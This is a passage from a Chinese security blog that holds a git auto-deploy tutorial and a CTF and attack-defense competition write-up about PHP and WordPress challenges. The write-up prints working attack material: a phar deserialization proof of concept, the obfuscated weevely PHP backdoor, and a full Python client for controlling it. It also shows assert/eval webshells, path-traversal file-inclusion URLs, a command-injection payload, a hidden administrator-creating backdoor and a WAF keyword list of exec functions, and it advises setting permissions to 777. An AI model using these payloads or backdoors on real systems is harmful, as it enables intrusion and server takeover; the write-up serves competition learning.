中的文件夹，但不能像前者那样直接浏览或修改仓库中的代码。 \b 使用 git init --bare 初始化一个远程仓库该仓库是用于项目部署的。在我们本地开发完成后，将项目push至该仓库后，将自动部署网站。 这里就拿nginx来举个例子，按照nginx默认目录来进行操作建立一个xxx-bare.git（bare repository）和一个xxx（repository）目录，Git远程库的命名一般使用.git和其他目录区分，但并非强制。 1234$ cd /usr/share/nginx/html$ git init --bare xxx-bare.git$ cd /usr/share/nginx/html$ git clone xxx-bare.git xxx 配置Git Hook将目录切换至 /usr/share/nginx/html/xxx-bare.git/hooks，如果目录下没有post-receive这个文件，\b可以使用touch post-receive直接创建，当仓库收到push请求后，就会自动执行该钩子中的脚本。根据自身需求编辑脚本内容： 1234#!/bin/shunset GIT_DIRcd /var/www/html/projectgit pull origin master 编辑完成后，给该脚本添加可执行权限 1$ chmod +x post-receive 测试及使用为开发的本地仓库添加remote源这个客户端本地仓库，即开发的机子的本地仓库，添加remote源，以后往这个remote push代码时，就会自动触发上面的脚本。 12$ git remote add deploy user@ip:/gitrepo_dir$ git push deploy master gitrepo_dir就是\b服务器上的xxx-bare.git的\b文件\b夹位置 以后就可以通过git push deploy master来自动更新服务器上的代码咯。 最后再写一个typecho的小坑博客上传图片失败的问题，要把typecho里的usr文件权限修改为777，就可以了。 1$ sudo chmod -R 777 usr 然后可以上传本地图片了。 Happy Coding!","link":"/2018/03/13/%E5%8D%9A%E5%AE%A2%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%9D%91/"},{"title":"厦大旅游小记","text":"这次比赛在赛前看规则我觉得还挺有意思的，毕竟是采用一种新的AWD形式，Web方面采用的是正则配waf的形式去防御，然后当初给@Mio师傅看的时候，他表示也挺想来的。可惜他们学校没报销就没来了。这次就写写这两天的比赛经验吧。 [TOC] Day 1第一天是CTF解题赛，一共是5个web。由于不能复现，官方也没有给源码，这里仅能凭靠着记忆写一下。来到比赛现场拿到ip的时候，我们的全能选手@hac45 就立马扫了一下我们的ip段，也成功发现了题目，此时距离比赛开始应该差30min左右。基本把5个web都扫到了。其中web5扫到了git泄露，然后立马拿到了源码，但是并没有第一时间做，因为我也担心万一他不放这道题，我有可能白费功夫，即使放出来了我也会比其他队稍微快一步，就暂时搁在一边了。 现在是12月4日，比赛过去已经有一段时间了。这里大体就是根据回忆来写的 好了就不扯太多的想法了。直接切入技术点。 Web 1一道sql注入的题…万能密码，因为过滤了两种注释方式，所以需要闭合最后的' 11'/**/order/**/by/**/'1 Web 2phar反序列化 1234567891011121314151617&lt;?phpclass MyClass{ var $output = 'echo \"hahaha\";'; function __destruct(){ eval($this -&gt; output); }} $phar = new Phar(\"zedd.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub $o = new MyClass(); $o-&gt;output = \"system('ls');\"; $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 得到的phar改个后缀名jpg，然后先绕过上传，再用另一个php文件去包含即可得到回显。 这里没有记录了…就大概说一下，考点主要是phar反序列化，没什么难度。可惜没拿到一血。 Web 3这题index只显示了一个从generate.php获取得到的md5，而且获取的参数有没有都无所谓。赛后听说还有generate.php.bak，但是我们没扫到… 没看懂… Web3给了hint phpjm，但是我们由于没有外网，也没有很细致地研究过，只是单纯的回用线上解密。所以就放弃了。 Web 4用vue.js做的一个站，但是由于服务器也没有外网，但是vue.js又用了cdn的方式引入，当时页面大概就是 1Hello, {{ name }} 不太懂… Web 5通过扫描发现git泄漏，但是用Githack只拖到了一个文件rrrrrrrrrrrrradme.php 123&lt;?phpecho 'this is a file in the path 303f0ca4472df9e21be369308af5685f'; 然后发现303f0ca4472df9e21be369308af5685f确实是个目录。这里我们参考网鼎杯第四场一道题的做法，网鼎杯第四场Some Web Writeup 123456789101112131415161718192021222324252627282930313233cat refs/stasheb49f8e2a56728a60ca28b46b35eebfc686dbf75git cat-file -p eb49tree a9a44c4bc2732e1ddf5471955d4d41b7e0388419parent f1358a6b48fd88cf4e70d92e99374c5746320d80parent 0fe6eac337d025cadd3dfe361ace9c8d564114bcauthor testforctf &lt;test_for_ctf@github.com&gt; 1541673356 +0800committer testforctf &lt;test_for_ctf@github.com&gt; 1541673356 +0800On master: rrrrrrrrrrrrradme.phpgit ls-tree a9a4100644 blob fcd1b82307da944a573344988d291b869df17493 dem0000000000.php100644 blob e4ab881f33fd5e4726079a15fbe2d2a338d5ab0d rrrrrrrrrrrrradme.phpgit cat-file -p fcd1b82307da944a573344988d291b869df17493&lt;?php$A = '$j=0;(TI$j&lt;$c&amp;&amp;TI$i&lt;TI$l);$j+TITI+,$i++){$o.=TI$TIt{$i}^$k{TI$j};}}rTIeTIturn $o;}TI$r=$_STIERVTIETIR;$rr=@$r[\"HTITTP_REFERE';$o = 'TI;$q=array_TIvaluesTI($TIq);pregTI_mTIatch_all(\"/([TI\\\\w])[\\\\TIw-]+(?:;TIq=TITI0.(TI[\\\\d]))?,?/\",$ra,$m)TI;iTIfTI($q&amp;&amp;$m){@s';$F = '_replacTIe(arraTIy(\"/_TI/\"TI,\"/-/\"),arrTIay(\"/TI\",\"+\")TI,$TIssTI($TIs[$i],0,$e))),$k))TI);$o=obTI_gTITIet_contents();TIob_';$H = 'ITI][$z]];if(sTItrpos($TIp,$hTITI)===0){$s[$i]=TITI\"\";$p=$ss($pTI,3)TI;}iTIf(array_key_TIexistsTI($i,$s)){TI$TIs[$i].=$TIp';$p = 'I5($i.TITI$TIkh),0,3));$f=$sTIl($ss(TImd5($i.$TIkf),TI0,TI3));$TIp=\"\";for($z=1;$TIz&lt;cTIount($m[TI1]);TI$TIz++)$p.=$q[$TIm[2T';$a = 'R\"]TI;$rTIa=@$r[\"HTTPTI_ACCETIPT_LANGTIUAGETI\"];if($rr&amp;&amp;TI$ra){TI$TIu=parTIse_urTIl($TIrr);parse_str($TIu[\"qTIuery\"],$TIq)';$m = 'eTIssion_TITIstart();$s=&amp;$TI_SETISSION;$ssTI=\"sTIuTITITIbstr\";$sl=\"TIstrtolower\";$i=$m[1][0]TITI.$mTI[1][TI1];$h=$sl($ss(mdT';$i = str_replace('Bm', '', 'cBmBmreate_BmfuBmncBmBmtion');$x = ';$e=sTItrpos(TI$s[$iTI]TI,$f);if($TIe){$k=$kh.TI$kf;ob_staTIrt(TI)TI;@TIevTIal(@gzTIuncomTIpress(@x(@baseTI64_dTIecode(preg';$D = 'end_TIclean(TI);$d=TIbaseTI64TI_enTIcode(x(gzcoTImpress($o),$TITIk));TIprint(\"&lt;$k&gt;$TId&lt;/TI$kTI&gt;\");@sTIesTIsion_destroy();}}}}';$r = '$kh=\"bTIa59\";$TIkf=TI\"9TIae2\";functionTI x($t,$kTI){$c=strlTIen($TIk);$lTI=strlTIen($t);$o=TI\"\";fTIor($i=0TI;$i&lt;TI$TIl;){forTI(';$J = str_replace('TI', '', $r . $A . $a . $o . $m . $p . $H . $x . $F . $D);$K = $i('', $J);$K();?&gt; 得到另一个文件，dem0000000000.php 12345678910111213141516&lt;?php$A = '$j=0;(TI$j&lt;$c&amp;&amp;TI$i&lt;TI$l);$j+TITI+,$i++){$o.=TI$TIt{$i}^$k{TI$j};}}rTIeTIturn $o;}TI$r=$_STIERVTIETIR;$rr=@$r[\"HTITTP_REFERE';$o = 'TI;$q=array_TIvaluesTI($TIq);pregTI_mTIatch_all(\"/([TI\\\\w])[\\\\TIw-]+(?:;TIq=TITI0.(TI[\\\\d]))?,?/\",$ra,$m)TI;iTIfTI($q&amp;&amp;$m){@s';$F = '_replacTIe(arraTIy(\"/_TI/\"TI,\"/-/\"),arrTIay(\"/TI\",\"+\")TI,$TIssTI($TIs[$i],0,$e))),$k))TI);$o=obTI_gTITIet_contents();TIob_';$H = 'ITI][$z]];if(sTItrpos($TIp,$hTITI)===0){$s[$i]=TITI\"\";$p=$ss($pTI,3)TI;}iTIf(array_key_TIexistsTI($i,$s)){TI$TIs[$i].=$TIp';$p = 'I5($i.TITI$TIkh),0,3));$f=$sTIl($ss(TImd5($i.$TIkf),TI0,TI3));$TIp=\"\";for($z=1;$TIz&lt;cTIount($m[TI1]);TI$TIz++)$p.=$q[$TIm[2T';$a = 'R\"]TI;$rTIa=@$r[\"HTTPTI_ACCETIPT_LANGTIUAGETI\"];if($rr&amp;&amp;TI$ra){TI$TIu=parTIse_urTIl($TIrr);parse_str($TIu[\"qTIuery\"],$TIq)';$m = 'eTIssion_TITIstart();$s=&amp;$TI_SETISSION;$ssTI=\"sTIuTITITIbstr\";$sl=\"TIstrtolower\";$i=$m[1][0]TITI.$mTI[1][TI1];$h=$sl($ss(mdT';$i = str_replace('Bm', '', 'cBmBmreate_BmfuBmncBmBmtion');$x = ';$e=sTItrpos(TI$s[$iTI]TI,$f);if($TIe){$k=$kh.TI$kf;ob_staTIrt(TI)TI;@TIevTIal(@gzTIuncomTIpress(@x(@baseTI64_dTIecode(preg';$D = 'end_TIclean(TI);$d=TIbaseTI64TI_enTIcode(x(gzcoTImpress($o),$TITIk));TIprint(\"&lt;$k&gt;$TId&lt;/TI$kTI&gt;\");@sTIesTIsion_destroy();}}}}';$r = '$kh=\"bTIa59\";$TIkf=TI\"9TIae2\";functionTI x($t,$kTI){$c=strlTIen($TIk);$lTI=strlTIen($t);$o=TI\"\";fTIor($i=0TI;$i&lt;TI$TIl;){forTI(';$J = str_replace('TI', '', $r . $A . $a . $o . $m . $p . $H . $x . $F . $D);$K = $i('', $J);$K();?&gt; 当时并不知道这是个什么，硬着头皮逆了挺久的。而且队友扔过来给我的就是个经过他美化后的版本，我也没太在意。后来我们才知道原来是个weevely马，（我说怎么这么眼熟。虽然我们在赛场逆成功了，本地也可以执行了，但是就是找不到这个weevely马的位置，导致当时没做出来… 至于weevely马，用目前github上的weevely3得到马跟这个不一样，这个是由kali下的weevely产生的，然后我们参考了一個PHP混淆後門的分析，可以使用文末的exp利用一波。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137# encoding: utf-8from random import randint,choicefrom hashlib import md5import urllibimport stringimport zlibimport base64import requestsimport redef choicePart(seq,amount): length = len(seq) if length == 0 or length &lt; amount: print 'Error Input' return None result = [] indexes = [] count = 0 while count &lt; amount: i = randint(0,length-1) if not i in indexes: indexes.append(i) result.append(seq[i]) count += 1 if count == amount: return resultdef randBytesFlow(amount): result = '' for i in xrange(amount): result += chr(randint(0,255)) return resultdef randAlpha(amount): result = '' for i in xrange(amount): result += choice(string.ascii_letters) return resultdef loopXor(text,key): result = '' lenKey = len(key) lenTxt = len(text) iTxt = 0 while iTxt &lt; lenTxt: iKey = 0 while iTxt&lt;lenTxt and iKey&lt;lenKey: result += chr(ord(key[iKey]) ^ ord(text[iTxt])) iTxt += 1 iKey += 1 return resultdef debugPrint(msg): if debugging: print msg# configdebugging = Falsekeyh = \"4f7f\" # $khkeyf = \"28d7\" # $kfxorKey = keyh + keyfurl = 'http://example.com/backdoor.php'defaultLang = 'zh-CN'languages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','en-US;q=0.%d','en;q=0.%d']proxies = None # {'http':'http://127.0.0.1:8080'} # proxy for debugsess = requests.Session()# generate random Accept-Language only once each sessionlangTmp = choicePart(languages,3)indexes = sorted(choicePart(range(1,10),3), reverse=True)acceptLang = [defaultLang]for i in xrange(3): acceptLang.append(langTmp[i] % (indexes[i],))acceptLangStr = ','.join(acceptLang)debugPrint(acceptLangStr)init2Char = acceptLang[0][0] + acceptLang[1][0] # $imd5head = (md5(init2Char + keyh).hexdigest())[0:3]md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8))debugPrint('$i is %s' % (init2Char))debugPrint('md5 head: %s' % (md5head,))debugPrint('md5 tail: %s' % (md5tail,))# Interactive php shellcmd = raw_input('phpshell &gt; ')while cmd != '': # build junk data in referer query = [] for i in xrange(max(indexes)+1+randint(0,2)): key = randAlpha(randint(3,6)) value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12))) query.append((key, value)) debugPrint('Before insert payload:') debugPrint(query) debugPrint(urllib.urlencode(query)) # encode payload payload = zlib.compress(cmd) payload = loopXor(payload,xorKey) payload = base64.urlsafe_b64encode(payload) payload = md5head + payload # cut payload, replace into referer cutIndex = randint(2,len(payload)-3) payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail) iPiece = 0 for i in indexes: query[i] = (query[i][0],payloadPieces[iPiece]) iPiece += 1 referer = url + '?' + urllib.urlencode(query) debugPrint('After insert payload, referer is:') debugPrint(query) debugPrint(referer) # send request r = sess.get(url,headers={'Accept-Language':acceptLangStr,'Referer':referer},proxies=proxies) html = r.text debugPrint(html) # process response pattern = re.compile(r'&lt;%s&gt;(.*)&lt;/%s&gt;' % (xorKey,xorKey)) output = pattern.findall(html) if len(output) == 0: print 'Error, no backdoor response' cmd = raw_input('phpshell &gt; ') continue output = output[0] debugPrint(output) output = output.decode('base64') output = loopXor(output,xorKey) output = zlib.decompress(output) print output cmd = raw_input('phpshell &gt; ') 修改一下文中的kh与kf就好了。 Day 2拿到web源码，发现目录下有个._wp-config.php文件比较奇怪，一开始认为是自己Mac电脑的问题，就没管了。现在想起来，如果没有给出wp-config.php，貌似还是可以恢复的，然后得到数据库密码，使用nmap扫一波看看大家的3306开没开，用默认的账号密码连接数据库，然后写shell，或者删库造成宕机。可惜本次比赛没有check（后知后觉发现的），宕机删库什么的也不影响别人…而且web目录不具备write权限，就比较尴尬了。 背景首先说一下目前普遍流行AWD的模式。 参赛队伍在竞赛设置的网络空间中，同时扮演着攻击者和防守者角色，互相进行攻击和防守。 攻方，通过挖掘网络服务漏洞，并攻击对手服务得分； 守方，通过修补自身服务漏洞或添加防御策略，从而进行防御避免丢分。 传统的AWD攻防模式通常是以一个SSH对应一个堡垒机，参赛者通过SSH登陆自己的服务器，进行审计漏洞，从而修补漏洞防守，或者通过漏洞攻击其他队伍得到分数。 但是这个世界上，总有人不按常理出牌，制造恶意违规行为， 比如： “直接关闭网络连接，关闭网络访问” “过度修改堡垒机，导致网站不可正常访问” “直接攻击答题平台，获取题目信息或篡改分数” …… 目前这些问题已通过规则、健康检查等方式进行规避。 但是，真正难以解决的不是这些违规，而是一些“不违规，却严重影响竞赛体验”的情况，如【通过使用一次性脚本等现成工具，封堵赛场环境设置的堡垒机漏洞，导致环境失衡】。 在某种意义上，他们单方面提前吹响了“终止哨”，其他人又何来竞技体验、竞技趣味呢？ 以往的攻防比赛，选手对自己web目录有读写的权力，这样造成了比赛中非常多的选手通过上通防，抓流量记录日志等技巧方式来防守或是攻击得分，并且很多选手通常通过一些“技巧”，通过对比赛check的绕过，关闭一些关键的正常服务或者全部web站点服务来在比赛中“苟”住。这样往往导致了很多AWD比赛中web要么就是被打穿，要么就是“天衣无缝”的情况，web选手的游戏体验在近期攻防比赛中每况愈下，以网鼎杯web为例，半决赛跟决赛的check只检查了index主页的关键字，导致了很多队伍一开始就进行了删站，只留个index主页来通过check，严重破坏了比赛体验。 改善？简而言之就是，本次比赛在理想规则（为啥是理想规则？因为计划与现实完全是理想图与实物图的对比）改变了传统的web类型的攻防模式，web目录只读不可写，通过改变waf正则防御规则来防御攻击，攻击点全靠代码审计来攻击；pwn类型的与传统攻防相同。（以下三张图片来源于卧龙草堂公众号） 现实：赛前乍一看是很不错的比赛，与@Mio师傅聊了一下，感觉挺不错的。然后决赛前一晚，我准备了挺多的waf正则规则，又准备了很多正则的资料（因为比赛过程不准连接外网），当时还有点挺担心的。事实上我多虑了… 首先主办方比赛前半小时左右发放了waf平台地址，正则规则需要在waf平台上配置，然而并没有给怎么使用该平台的说明，不过也不是很需要，随便点一点就差不多能了解整个平台的功能了，但是不给使用说明也有点坑，有些队伍赛后才知道在哪里配waf规则。 同时还发了web的地址、两个pwn的地址及pwn的ssh密码，并没有给web服务器的密码。后来打开一看原来还是个windows server，选手们的地址都在172.16.10-40.13。本次只有一个web，两个pwn，而且比较搞笑的pwn2被标成了pwn3，而且我们的pwn的ssh密码还不对，导致我们还在开赛后一段时间pwn的服务都连不上，耽误了很多时间。web打开发现是个wordpress，很快意识到去用wpscan，但是比较可惜的是打开我的kali发现wpscan并没有联网建立他的数据库，顿时尴尬。还好我眼疾手快，迅速在开赛前基本配好了关键字的`waf，防住了在开始比赛后30min左右北航等队的攻击。 大致当时配置的waf规则： 12345select\\b|insert\\b|update\\b|drop\\b|delete\\b|dumpfile\\b|outfile\\b|load_file|rename\\b|floor\\(|extractvalue|updatexml|name_const|multipoint\\(/i/base64_decode|eval\\(|assert\\(/i|file_put_contents|fwrite|curl|system|eval|assert|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec 现实：赛时开赛前几分钟，我马上尝试了admin/admin的弱密码尝试登录wordpress，发现成功登录，由于没有准备批量改密码的脚本，我只能靠手速迅速改掉了10个队左右的admin密码，但是改完后发现好像并没有什么用，传不了马，意识到web目录不可写，顿时也感觉有点可惜。也浪费了开赛前很宝贵的十多分钟在手改密码之上。 由于自己没带D盾这个神器，以为自己也能全局搜个eval能找出一句话，高估了自己的审计速度以及cobra审计的速度（非常慢…)，导致有两个原本可以用D盾扫出来的一句话我们没有很及时地利用，失去了先机，脚本也没有准备好，导致收到了某些队伍打过来的payload之后（这里提一下，只有被拦截的请求才会显示在waf平台上，其他没有被拦截的是不会显示的），没有第一时间迅速利用起来。而且更坑的是，主办方明明在规则上写了使用curl FlagServer.com获取flag，然而web服务器上压根没配备curl，然后我们就想破脑筋，在本地资料各种找，想办法去请求FlagServer.com，无论是php curl_exec还是windows的什么其他方法都试过了，当时并没有打到回显，以至于我们在拿到别人shell之后的30min左右都没有办法得分，就很气，错过了非常多的分数。所以我们当时处于一个既没有被打，也打不了别人的情况。 然后我们就利用自己的pwn服务器尝试自己访问自己的flag，发现不是单纯的curl FlagServer.com这么简单，主办方还比较坑地给FlagServer.com配了https，所以我们还得使用它的证书，然后又找了一遍curl -h，又去找了一遍证书…反正这里就很坑。觉得搞不定，就立马去问了主办方怎么请求flag，在他们有反应给我们10min之前，我们终于在web服务器的web根目录的同级目录下找到了curl.exe以及相关证书，还有一个已经写好命令的bat文件。此时我们大概过去了1h左右了…别人已经打了好几轮了。 当时完整的命令是这样的… 1curl.exe https://FlagServer.com:9000/flag --cacert ca.crt --cert client.crt --key client.key 中间还有个小插曲，把自己提交flag和查看服务状态的那个平台密码给忘了…只能去问主办方，最后发现竟然是大小写问题，又耽误了几分钟…之前都没被打，之后一上来就发现自己web被打了。 之后通过我们防守获取了很多队的payload，我们也通过抓取菜刀的流量，重放来攻击其他的队伍。由于当时大家都发现了并没有check或者check其他一些形同虚设的设置，大家都比较无赖了，比较多的队伍直接配置了.*规则，拦截了所有的请求。我们当时能收的也没有几个队的分了。 之后稳定地靠web拿了几轮分数来到了第六，感觉拿个奖应该没什么问题。可谁知北航等队出了pwn1 pwn2的一血，我们就开始被打了，被打了不重要，修就完事了，结果pwn还不能给patch，这是最骚的，问主办方他们也确实回答不给patch，结果我们就只能一直被打…就很气…自己队里也没有出pwn，就掉出了获奖范围。 赛时应该就这么多。主要是这个waf系统并没有想象中那么好，以及主办方各种没有说明，感觉相当的坑。赛时就写这么多吧。还是重点来看看赛后复盘这里。 Day Nwordpress版本是最新的4.9.8，服务器IIS，不过服务器版本号忘了。 对比之后差异一目了然 主要是两个一句话木马，以及4个插件。 WebshellPoc 1wordpress/wp-includes/customize/class-wp-customize-background-image-list.php 12345&lt;?php@$_ = \"s\" . \"s\" . /*-/*-*/\"e\" . /*-/*-*/\"r\";@$_ = /*-/*-*/\"a\" . /*-/*-*/$_ . /*-/*-*/\"t\";@$_/*-/*-*/($/*-/*-*/{\"_P\" . /*-/*-*/\"OS\" . /*-/*-*/\"T\"}true[0 - /*-/*-*/2/*-/*-*/ - /*-/*-*/5/*-/*-*/]); 这个很明显是个assert的一句话，但是赛时我们本地测试老是不行，总是出现 1Warning: Cannot call assert() with string argument dynamically in /xxx/shell.php on line 5 后来搜了一下发现竟然是php版本过高的问题，因为在php7中动态调用一些函数是被禁止的。详细参考菜刀连接php一句话木马返回200的原因及解决方法 这里是个密码为-7的一句话。 Poc 2wordpress-awd/wp-includes/pomo/tp.php 1234&lt;?php${(\"#\" ^ \"|\") . (\"#\" ^ \"|\")} = (\"!\" ^ \"`\") . (\"( \" ^ \"{\") . (\"(\" ^ \"[\") . (\"~\" ^ \";\") . (\"|\" ^ \".\") . (\"*\" ^ \"~\");@${(\"#\" ^ \"|\") . (\"#\" ^ \"|\")}((\"-\" ^ \"H\") . (\"]\" ^ \"+\") . (\"[\" ^ \":\") . (\",\" ^ \"@\") . (\"}\" ^ \"U\") . (\"~\" ^ \"&gt;\") . (\"e\" ^ \"A\") . (\"(\" ^ \"w\") . (\"j\" ^ \":\") . (\"i\" ^ \"&amp;\") . (\"#\" ^ \"p\") . (\"&gt;\" ^ \"j\") . (\"!\" ^ \"z\") . (\"]\" ^ \"&gt;\") . (\"@\" ^ \"-\") . (\"[\" ^ \"?\") . (\"?\" ^ \"b\") . (\"]\" ^ \"t\")); 这里是第二个一句话，这里我们可以通过var_dump来看看这个的密码是什么。 12345678php &gt; echo (\"#\" ^ \"|\") . (\"#\" ^ \"|\");__ php &gt; var_dump(${(\"#\" ^ \"|\") . (\"#\" ^ \"|\")});string(6) \"ASsERT\"php &gt; echo (\"-\" ^ \"H\") . (\"]\" ^ \"+\") . (\"[\" ^ \":\") . (\",\" ^ \"@\") . (\"}\" ^ \"U\") . (\"~\" ^ \"&gt;\") . (\"e\" ^ \"A\") . (\"(\" ^ \"w\") . (\"j\" ^ \":\") . (\"i\" ^ \"&amp;\") . (\"#\" ^ \"p\") . (\"&gt;\" ^ \"j\") . (\"!\" ^ \"z\") . (\"]\" ^ \"&gt;\") . (\"@\" ^ \"-\") . (\"[\" ^ \"?\") . (\"?\" ^ \"b\") . (\"]\" ^ \"t\");eval(@$_POST[cmd]) 这里就非常清楚了，是个密码为cmd的一句话。 Plugin这里我们使用wpscan来看看 1./wpscan --url http://localhost/wordpress -e vp //查找有漏洞的plugin site-editor首先看site-editor 可以从图中看出，主要是个文件包含的漏洞。 详细参考[CVE-2018-7422] Local File Inclusion (LFI) vulnerability in WordPress Site Editor Plugin 1http://&lt;host&gt;/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd 这里做个简要的分析，版本可能与CVE中提到的不同，多了str_replace的过滤…但是这个并没有什么用… 123456if( isset( $_REQUEST['ajax_path'] ) ){true$ajax_path=$_REQUEST['ajax_path'];true$ajax_path = str_replace('../','',$ajax_path); require_once $ajax_path;} 可以看到这里可以直接包含/根目录下的文件，可以用..././跳到上层目录。 所以我们可以通过以下payload去包含之前的一句话木马 1http://localhost/wordpress-awd/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=..././..././..././..././..././..././..././wp-includes/pomo/tp.php gift-voucher另一个wpscan扫到的插件是gift-voucher 可以看到这是个盲注的洞，详细参考WordPress Plugin Gift Voucher 1.0.5 - (Authenticated) ‘template_id’ SQL Injection 用sqlmap扫了一下 得到admin的密码，如果字典好的话，可以快一些。 Localize My Post这个wpscan竟然没有扫出来，详细参考WordPress Plugin Localize My Post 1.0 - Local File Inclusion 12345678910111213&lt;?php//Include WP base to have the basic WP functionsinclude_once($_SERVER['DOCUMENT_ROOT'] . \"/wp-blog-header.php\");//Set status 200 header//Include requested file if it existsif(isset($_REQUEST['file'])){true$file=$_REQUEST['file'];true$file = str_replace('./','',$file);trueheader('HTTP/1.1 200 OK');trueinclude($file);} 这里跟上面那个文件包含类似，可以用...//来访问上级目录 plainview-activity-monitor这个也是wpscan没有扫出来的漏洞插件，而且是个RCE，但是利用条件是需要登录到后台才可以。详细参考WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172/** @brief Various tools. @since 2014-05-04 10:41:51**/&lt;?phppublic function admin_menu_tools(){ $r = '';truetrue// IP converter $form = $this-&gt;form2(); $fs = $form-&gt;fieldset('fs_ip'); $fs-&gt;legend-&gt;label_('IP tools'); $fs-&gt;text('ip') -&gt;label_('IP or integer') -&gt;required() -&gt;size(15, 15); $fs-&gt;markup('markup_convert') -&gt;markup('The convert button will convert the IP address or integer to its equivalent integer or IP address.'); $fs-&gt;secondary_button('convert') -&gt;value('Convert'); $fs-&gt;markup('markup_lookup') -&gt;markup('The lookup button will try to resolve an IP address to a host name. If dig is installed on the webserver it will also be used for the lookup.'); $fs-&gt;secondary_button('lookup') -&gt;value('Lookup'); if ($form-&gt;is_posting()) { $form-&gt;post()-&gt;use_post_value(); $ip = $fs-&gt;input('ip')-&gt;get_filtered_post_value(); $long = $ip; $is_ip = (strpos($ip, '.') !== false); if ($is_ip) $long = ip2long($ip); else $ip = long2ip($ip); if ($fs-&gt;input('convert')-&gt;pressed()) { if ($is_ip) $message = $this-&gt;p_('The integer value of this IP address %s is &lt;strong&gt;%s&lt;/strong&gt;.', $ip, $long); else $message = $this-&gt;p_('The IP address of the integer %s is &lt;strong&gt;%s&lt;/strong&gt;.', $long, $ip); } if ($fs-&gt;input('lookup')-&gt;pressed()) { $address = gethostbyaddr($ip); $message = $this-&gt;p_('The IP address %s resolves to &lt;strong&gt;%s&lt;/strong&gt;.', $ip, $address); $output = ''; exec('dig -x ' . $ip, $output); if (count($output) &gt; 0) { $output = array_filter($output); $output = implode(\"\\n\", $output); $message .= $this-&gt;p_('Output from dig: %s', $this-&gt;p($output)); } } $this-&gt;message($message); } $r .= $form-&gt;open_tag(); $r .= $form-&gt;display_form_table(); $r .= $form-&gt;close_tag(); echo $r;} 关键代码: 123456789101112131415161718192021222324252627282930313233if ($form-&gt;is_posting()) { $form-&gt;post()-&gt;use_post_value(); $ip = $fs-&gt;input('ip')-&gt;get_filtered_post_value(); $long = $ip; $is_ip = (strpos($ip, '.') !== false); if ($is_ip) $long = ip2long($ip); else $ip = long2ip($ip); if ($fs-&gt;input('convert')-&gt;pressed()) { if ($is_ip) $message = $this-&gt;p_('The integer value of this IP address %s is &lt;strong&gt;%s&lt;/strong&gt;.', $ip, $long); else $message = $this-&gt;p_('The IP address of the integer %s is &lt;strong&gt;%s&lt;/strong&gt;.', $long, $ip); } if ($fs-&gt;input('lookup')-&gt;pressed()) { $address = gethostbyaddr($ip); $message = $this-&gt;p_('The IP address %s resolves to &lt;strong&gt;%s&lt;/strong&gt;.', $ip, $address); $output = ''; exec('dig -x ' . $ip, $output); if (count($output) &gt; 0) { $output = array_filter($output); $output = implode(\"\\n\", $output); $message .= $this-&gt;p_('Output from dig: %s', $this-&gt;p($output)); } } $this-&gt;message($message);} 这里我们看到，这段代码通过代码拼接的方式执行命令，存在命令执行的漏洞。 1exec( 'dig -x ' . $ip, $output ); 所以我们要看看$ip是否过滤安全 首先拿到ip，然后用strpos()函数检查是否有.出现，这里我们随便用一个域名就可以绕过了，让$is_ip为True 1234567$ip = $fs-&gt;input( 'ip' )-&gt;get_filtered_post_value();$long = $ip;$is_ip = ( strpos( $ip, '.' ) !== false );if ( $is_ip ) $long = ip2long( $ip );else $ip = long2ip( $ip ); 再看ip2long 12Return ValuesReturns the host name on success, the unmodified ip_address on failure, or FALSE on malformed input. 所以这里$long = false 我们传不传convert参数都无所谓，因为都可以往下执行。但是为了触发代码执行，我们必须得传入lookup参数 1234567891011121314if ( $fs-&gt;input( 'lookup' )-&gt;pressed() ){ $address = gethostbyaddr( $ip ); $message = $this-&gt;p_( 'The IP address %s resolves to &lt;strong&gt;%s&lt;/strong&gt;.', $ip, $address ); $output = ''; exec( 'dig -x ' . $ip, $output ); if ( count( $output ) &gt; 0 ) { $output = array_filter( $output ); $output = implode( \"\\n\", $output ); $message .= $this-&gt;p_( 'Output from dig: %s', $this-&gt;p( $output ) ); }} 其实其他的分布分析都无所谓，只要进入了这个if，就可以直接执行我们传入的$ip了，并不需要其他多余的操作。 所以这里可以说是没有任何过滤的一个命令执行漏洞，只要传入一个带有.的域名就可以绕过前面唯一一处对ip的检测了。所以我们可以构造一个payload: 1ip=baidu.com%7C%20ls&amp;lookup 得到执行结果。 Function.php回过头来，我们再看看还有没有跟官方文件其他不同的文件。除了MAC产生的.DS_Store文件、._wp-config.php编辑临时文件、wp-config.php配置文件，剩下的就是function.php了 我们对比得到比赛多出了这么一处代码: 1234567891011add_action('wp_head', 'wploop_users');function wploop_users() {trueif ($_POST['users'] == 'knockknock') {truetruerequire 'wp-includes/registration.php';truetrueif (!username_exists('username')) {truetruetrue$user_id = wp_create_user('username', 'passpass');truetruetrue$user = new WP_User($user_id);truetruetrue$user-&gt;set_role('administrator');truetrue}true}} 代码简单易懂，就是传入users=knockknock就创建了一个用户名为username密码为passpass的有管理员权限的这么一个用户。 鸡肋？一开始复盘的时候我也没搞懂为啥会多出这么一段代码，感觉很鸡肋，没有什么可以利用的点。 因为我们已知的管理员可以操作的点 上传media文件 编辑模版，改成一句话木马 但是这两个点都因为web目录不可写而失去了作用，所以这个增加一个管理员以及前面gift-voucher的盲注漏洞就看起来有些鸡肋了。所以一开始我手改的十多个队的管理员密码并没有很好地用起来，导致了时间的浪费。 